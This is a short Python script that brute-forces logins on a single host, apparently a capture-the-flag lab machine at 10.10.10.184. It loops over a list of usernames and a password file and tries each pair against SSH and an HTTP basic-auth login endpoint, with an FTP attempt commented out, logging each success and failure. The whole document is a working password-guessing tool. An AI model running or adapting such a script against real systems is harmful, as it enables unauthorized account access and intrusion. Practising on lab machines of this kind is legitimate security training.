#!/usr/bin/env python

from ftplib import FTP
from requests import post
from requests.auth import HTTPBasicAuth
from pwn import *

HOST = '10.10.10.184'

users = ['Nadine', 'Nathan', 'nadine', 'nathan', 'admin', 'Admin', 'ADMIN']
passwords = [i.rstrip() for i in open('Passwords.txt', 'r').readlines()]
log.info(passwords)

def try_ftp(u, p):
    ftp = FTP(HOST, user=u, passwd=p)
    log.info('[*] {}:{} = {}'.format(u, p, ftp.login()))

def try_ssh(u, p):
    try:
        conn = ssh(host=HOST, user=u, password=p)
        print( '[+] Login succeeded: {}:{}'.format(u, p) )
    except Exception as e:
        print( '[-] Login failed: {}:{}'.format(u, p) )

def try_web(u, p):
    c = {'dataPort': '6063'}
    r = post('http://10.10.10.184/doLogin', auth=HTTPBasicAuth(u, p), cookies=c)
    if 'fail' in r.content:
        log.info('Login failed: {}:{}'.format(u, p))
    else:
        log.info('Login Succeeded: {}:{}'.format(u, p))

def main():
    for u in users:
        for p in passwords:
            #try_ftp(u, p)
            try_ssh(u, p)
            try_web(u, p)

if __name__=="__main__":
    main()
